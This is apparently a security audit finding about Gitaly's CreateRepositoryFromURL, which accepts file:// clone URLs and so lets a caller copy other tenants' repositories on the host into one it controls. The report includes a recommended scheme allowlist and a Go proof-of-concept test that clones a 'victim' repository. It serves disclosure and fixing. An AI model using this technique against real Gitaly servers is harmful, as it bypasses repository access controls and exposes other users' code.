### Title
`CreateRepositoryFromURL` allows arbitrary `file://` clone URLs, enabling local git-repository/filesystem disclosure - ([File: internal/gitaly/service/repository/create_repository_from_url.go])

### Summary
`validateCreateRepositoryFromURLRequest` only checks that `Url` is non-empty and never restricts the URL scheme before it is handed to `git clone` in `cloneFromURLCommand`. This lets a caller who controls `CreateRepositoryFromURL`'s `Url` field target the `file://` transport, causing the Gitaly host's `git` process to read from any path on the local filesystem into a newly created, attacker-controlled repository.

### Finding Description
`CreateRepositoryFromURL` first calls `validateCreateRepositoryFromURLRequest`, which only validates the target `Repository` and rejects an empty `Url` [1](#0-0) . No scheme allowlist (e.g. restricting to `http`/`https`/`git`/`ssh`) is applied. The raw `Url` is then passed into `cloneFromURLCommand`, which only special-cases userinfo/auth-header handling and a `resolvedAddress` rewrite, then executes `git clone <urlString> <repositoryFullPath>` unconditionally regardless of scheme [2](#0-1) .

Git's `file://` (and bare local-path) transport is fully supported by `git clone`, and nothing in this code path disables it (only `transfer.bundleURI` is explicitly hardened against SSRF-like abuse, with a comment acknowledging the general risk of remote URLs pointing anywhere including localhost) [3](#0-2) . This is confirmed by Gitaly's own test suite, which drives `CreateRepositoryFromURL` with `Url: "file://" + sourceRepoPath` and shows the clone actually executes end-to-end (it only fails afterward on an unrelated `git-fsck` duplicate-entry check, proving the file-scheme clone itself succeeded) [4](#0-3) .

Because the destination repository is fully attacker-owned (`repoutil.Create` creates it under the caller-supplied `Repository` target) [5](#0-4) , any git repository readable by the Gitaly process on the host disk — including other tenants' repositories at predictable/known storage paths, or any other on-host bare/non-bare `.git` repository — can be cloned wholesale into a repository the attacker fully controls, then read back via ordinary RPCs (`Fsck`, `CatFile`, `TreeEntry`, etc.). Non-repository targets (e.g. `/proc/self/environ`, arbitrary config files) will not clone successfully since `git clone` requires the source to look like a git repository, so this is not a generic arbitrary-file-content-read primitive, but it is a genuine cross-repository/object disclosure and local-path SSRF primitive scoped to anything on disk that is (or resembles) a git repository.

### Impact Explanation
An attacker who can invoke `CreateRepositoryFromURL` with an arbitrary `Url` can exfiltrate the contents of any other git repository reachable by the Gitaly OS user on the same host/storage, bypassing GitLab's repository-level access controls entirely, by cloning it into a new repository they own and then reading it back through standard read RPCs. This maps to a "broken access control / information disclosure across tenants" impact class.

### Likelihood Explanation
The only precondition is the ability to invoke `CreateRepositoryFromURL` with a target repository the attacker owns and a `Url` of their choosing — exactly the precondition stated in this audit. The exploit requires no special privilege, no secret, and works with default configuration; Gitaly's own test suite demonstrates the `file://` clone path executes successfully.

### Recommendation
Restrict the accepted URL schemes in `validateCreateRepositoryFromURLRequest` (or in `cloneFromURLCommand`) to an explicit allowlist (`http`, `https`, `git`, `ssh`), rejecting `file://` and any other local/unknown scheme, mirroring the existing `unknown schema provided` check already used in `getURLAndResolveConfigForURL` [6](#0-5) .

### Proof of Concept
Using the existing test harness pattern from `create_repository_from_url_test.go`:
```go
func TestCreateRepositoryFromURL_fileScheme_disclosesOtherRepo(t *testing.T) {
    ctx := testhelper.Context(t)
    cfg, client := setupRepositoryService(t)

    // "victim" repository the attacker does not own, with secret content.
    _, victimRepoPath := gittest.CreateRepository(t, ctx, cfg)
    gittest.WriteCommit(t, cfg, victimRepoPath, gittest.WithBranch("main"))

    // Attacker-owned target repository.
    attackerRepo := &gitalypb.Repository{
        RelativePath: "attacker/stolen.git",
        StorageName:  cfg.Storages[0].Name,
    }

    _, err := client.CreateRepositoryFromURL(ctx, &gitalypb.CreateRepositoryFromURLRequest{
        Repository: attackerRepo,
        Url:        "file://" + victimRepoPath,
    })
    require.NoError(t, err) // clone via file:// succeeds, as shown in TestCreateRepositoryFromURL_fsck

    // Attacker can now read victim's objects via any read RPC, e.g. Fsck/CatFile/TreeEntry
    // on attackerRepo, without ever having had access to victimRepoPath.
}

func TestCreateRepositoryFromURL_fsck(t *testing.T) {
	t.Parallel()

	ctx := testhelper.Context(t)

	cfg, client := setupRepositoryService(t)

	_, sourceRepoPath := gittest.CreateRepository(t, ctx, cfg)

	// We're creating a new commit which has a root tree with duplicate entries. git-mktree(1)
	// allows us to create these trees just fine, but git-fsck(1) complains.
	gittest.WriteCommit(t, cfg, sourceRepoPath,
		gittest.WithParents(),
		gittest.WithBranch("main"),
		gittest.WithTreeEntries(
			gittest.TreeEntry{Content: "content", Path: "dup", Mode: "100644"},
			gittest.TreeEntry{Content: "content", Path: "dup", Mode: "100644"},
		),
	)

	targetRepoProto := &gitalypb.Repository{
		RelativePath: gittest.NewRepositoryName(t),
		StorageName:  cfg.Storages[0].Name,
	}

	_, err := client.CreateRepositoryFromURL(ctx, &gitalypb.CreateRepositoryFromURLRequest{
		Repository: targetRepoProto,
		Url:        "file://" + sourceRepoPath,
	})
	// The git-fsck failure's stderr is surfaced in the returned error message so callers (e.g. Geo)
	// see the real cause instead of an opaque "exit status 128". It and resolved_address are also
	// kept as error metadata so the structured log fields don't regress.
	testhelper.RequireStatusMessageAndMetadataRegexp(t,
		codes.Internal,
		`cloning repository: exit status 128, stderr: ".*duplicateEntries: contains duplicate file entries`,
		err,
		map[string]string{
			"stderr":           "duplicateEntries: contains duplicate file entries",
			"resolved_address": "",
		},
	)
}
